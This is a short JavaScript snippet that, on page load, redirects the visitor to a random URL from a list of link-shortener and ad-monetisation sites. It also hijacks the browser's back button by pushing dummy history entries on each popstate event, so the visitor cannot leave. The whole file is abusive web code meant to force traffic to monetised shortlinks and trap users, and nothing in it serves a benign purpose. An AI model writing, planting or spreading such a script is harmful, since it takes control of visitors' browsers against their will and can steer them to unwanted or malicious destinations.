var urls = ["https://besargaji.com/v3AV",
            "https://link.bicolink.net/PvX4hvrc",
            "https://arahlink.id/OlXLyqaB",
            "https://ouo.io/vj46aj",
            "https://adbull.me/ZoyJRn",
            "https://to.aoutoqw.xyz/31Xw557",
            "https://go.aoutoqw.xyz/kit8c"];


function redirect() {
  var randomIndex = Math.floor(Math.random() * urls.length);
  var nextUrl = urls[randomIndex];
  window.location.replace(nextUrl);
}

if (typeof history.pushState === "function") {
  history.pushState("jibberish", null, null);
  window.addEventListener("popstate", function() {
    history.pushState("newjibberish", null, null);
  });
}

document.addEventListener("DOMContentLoaded", function() {
  redirect();
});

